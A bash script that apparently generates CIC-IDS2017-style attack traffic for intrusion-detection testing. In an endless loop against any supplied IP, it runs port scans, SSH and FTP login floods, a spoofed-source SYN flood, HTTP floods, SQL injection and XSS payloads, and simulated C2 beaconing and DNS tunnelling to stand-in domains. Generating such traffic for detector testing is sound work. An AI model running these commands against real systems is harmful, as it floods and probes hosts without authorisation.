#!/bin/bash
# Generate attack traffic matching CIC-IDS2017 dataset patterns
# Based on attack days from the dataset (Tuesday-Friday)

echo "╔════════════════════════════════════════════════════╗"
echo "║  CIC-IDS2017 Attack Traffic Generator             ║"
echo "╚════════════════════════════════════════════════════╝"
echo ""
echo "Simulating attack patterns from CIC-IDS2017 dataset"
echo "Press Ctrl+C to stop"
echo ""

# Get target (default to localhost for testing)
TARGET_IP="${1:-127.0.0.1}"
echo "Target: $TARGET_IP"
echo ""
sleep 2

# Check dependencies
if ! command -v nmap &> /dev/null; then
    echo "⚠️  Installing nmap..."
    sudo apt-get update > /dev/null 2>&1
    sudo apt-get install -y nmap > /dev/null 2>&1
fi

if ! command -v hping3 &> /dev/null; then
    echo "⚠️  Installing hping3 for DoS simulation..."
    sudo apt-get install -y hping3 > /dev/null 2>&1
fi

counter=1
while true; do
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "Round $counter - CIC-IDS2017 Attack Patterns"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

    # ATTACK 1: Port Scan (Friday - Port Scan)
    echo "[ATTACK 1/7] Port Scan - Scanning common ports..."
    nmap -sT -p 21,22,23,25,80,110,143,443,3306,3389,5900,8080 $TARGET_IP > /dev/null 2>&1 &
    sleep 2
    nmap -sT -p 1-100 $TARGET_IP > /dev/null 2>&1 &
    sleep 3

    # ATTACK 2: SSH Brute Force (Tuesday - Brute Force SSH)
    echo "[ATTACK 2/7] SSH Brute Force - Attempting SSH connections..."
    for i in {1..20}; do
        timeout 1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 \
            root@$TARGET_IP 2>/dev/null &
        sleep 0.1
    done
    sleep 2

    # ATTACK 3: FTP Brute Force (Tuesday - Brute Force FTP)
    echo "[ATTACK 3/7] FTP Brute Force - Attempting FTP connections..."
    for i in {1..15}; do
        timeout 1 bash -c "echo 'USER admin\nPASS password$i' | nc -w 1 $TARGET_IP 21" 2>/dev/null &
        sleep 0.1
    done
    sleep 2

    # ATTACK 4: DoS - SYN Flood (Wednesday - DoS attacks)
    echo "[ATTACK 4/7] DoS SYN Flood - Flooding with SYN packets..."
    if command -v hping3 &> /dev/null; then
        timeout 3 sudo hping3 -S -p 80 --flood --rand-source $TARGET_IP > /dev/null 2>&1 &
    else
        # Fallback: rapid connection attempts
        for i in {1..100}; do
            timeout 0.1 bash -c "echo '' > /dev/tcp/$TARGET_IP/80" 2>/dev/null &
        done
    fi
    sleep 3

    # ATTACK 5: DoS - HTTP Flood (Wednesday - DoS Hulk/GoldenEye)
    echo "[ATTACK 5/7] DoS HTTP Flood - Flooding HTTP requests..."
    for i in {1..50}; do
        curl -s http://$TARGET_IP/ > /dev/null 2>&1 &
        curl -s http://$TARGET_IP/index.html > /dev/null 2>&1 &
    done
    sleep 3

    # ATTACK 6: Web Attack - SQL Injection attempts (Thursday)
    echo "[ATTACK 6/7] Web Attack - SQL Injection patterns..."
    curl -s "http://$TARGET_IP/?id=1' OR '1'='1" > /dev/null 2>&1
    sleep 0.5
    curl -s "http://$TARGET_IP/login?user=admin'--" > /dev/null 2>&1
    sleep 0.5
    curl -s "http://$TARGET_IP/?id=1 UNION SELECT * FROM users" > /dev/null 2>&1
    sleep 0.5
    curl -s "http://$TARGET_IP/?search='; DROP TABLE users--" > /dev/null 2>&1
    sleep 2

    # ATTACK 7: Web Attack - XSS attempts (Thursday)
    echo "[ATTACK 7/7] Web Attack - XSS patterns..."
    curl -s "http://$TARGET_IP/?q=<script>alert('XSS')</script>" > /dev/null 2>&1
    sleep 0.5
    curl -s "http://$TARGET_IP/comment?text=<img src=x onerror=alert(1)>" > /dev/null 2>&1
    sleep 0.5
    curl -s "http://$TARGET_IP/?name=<svg/onload=alert('XSS')>" > /dev/null 2>&1
    sleep 2

    # ATTACK 8: DDoS - Multiple source simulation (Friday - DDoS)
    echo "[ATTACK 8/7] DDoS - Distributed attack simulation..."
    for port in 80 443 8080 22; do
        for i in {1..30}; do
            timeout 0.1 bash -c "echo '' > /dev/tcp/$TARGET_IP/$port" 2>/dev/null &
        done
    done
    sleep 3

    # ATTACK 9: Botnet-like behavior (Friday - Botnet ARES)
    echo "[ATTACK 9/7] Botnet - Command and control patterns..."
    # Simulate periodic beaconing to C2 server
    for i in {1..10}; do
        curl -s http://example.com/c2/beacon > /dev/null 2>&1 &
        sleep 0.2
    done
    # Rapid DNS queries (DNS tunneling pattern)
    for i in {1..15}; do
        nslookup "data$i.malicious-domain.com" > /dev/null 2>&1 &
    done
    sleep 3

    # ATTACK 10: Aggressive Service Enumeration
    echo "[ATTACK 10/7] Service Enumeration - Version detection..."
    nmap -sV -A -T4 -p 22,80,443 $TARGET_IP > /dev/null 2>&1 &
    sleep 3

    # Some benign traffic between attacks (realistic behavior)
    echo "[BENIGN] Normal traffic between attacks..."
    curl -s https://www.google.com > /dev/null 2>&1
    nslookup google.com > /dev/null 2>&1
    ping -c 5 8.8.8.8 > /dev/null 2>&1 &
    sleep 2

    echo "✓ Round $counter complete (attacks). Waiting 5 seconds..."
    echo ""
    sleep 5

    counter=$((counter + 1))
done
